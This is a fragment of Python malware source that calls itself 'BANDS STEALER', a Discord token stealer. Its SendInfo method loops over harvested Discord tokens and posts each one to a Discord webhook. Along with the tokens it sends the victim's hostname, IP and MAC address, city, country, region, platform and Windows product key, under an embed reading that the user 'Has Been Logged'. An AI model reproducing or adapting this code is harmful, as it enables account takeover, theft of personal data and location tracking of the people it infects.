    ...
    def SendInfo(self):
        if self.tokens == None:
            ...
            for token in self.tokens:                     
                ...
                webhook = DiscordWebhook(url=weblink, username="Bands", avatar_url="https://cdn.discordapp.com/attachments/961950134814535700/961950224874631228/Thighs2.jpg")
                
                embed = DiscordEmbed(title=f"💉 {user_name} Has Been Logged 💉",color=16777215)
                embed.set_author(name="BANDS STEALER", url='https://discord.gg/n1kegrb')
...
[Hostname] : {hostname}\n[IP Adresse] : {ip}\n[Mac Adresse] : {mac} \n[City] : {city}\n[Country] : {country}\n[Region] : {region}\n[Platform] : {wname}\n[Product Key] : {wkey if wkey else 'No Product Key'}```""")
                ...
                raw_url = "https://pastebin.com/raw/sZk6QMnG"
                ...
                # set footer
                embed.set_footer(text='BandsStealer')
